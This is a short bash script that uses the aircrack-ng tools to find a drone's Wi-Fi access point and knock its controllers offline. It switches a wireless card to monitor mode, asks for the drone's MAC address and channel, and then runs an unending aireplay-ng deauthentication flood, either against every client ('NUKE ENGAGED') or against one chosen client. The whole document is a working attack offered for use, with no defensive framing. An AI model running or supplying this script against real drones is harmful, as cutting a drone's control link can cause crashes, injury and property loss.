airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
read -p "Enter MAC Address of Drone:" droneMAC
read -p "Enter Channel of Drone:" droneCH
echo $droneMAC
echo $droneCH
echo "These are our mac addresses, do not kick these!"
airodump-ng --bssid $droneMAC -c $droneCH wlan0mon
read -p "Enter for NUKE, or MAC for client boot:" clientMAC
if [ -z "$clientMAC" ]
	then
	echo "NUKE ENGAGED"
	aireplay-ng --deauth 0 -a $droneMAC wlan0mon
	echo "HAVE A SWELL DAY ;)"
else
	echo "Booting {$clientMAC}..."
	aireplay-ng --deauth 0 -a $droneMAC -c $clientMAC wlan0mon
	echo "Client: {$clientMAC} booted from drone!"
fi
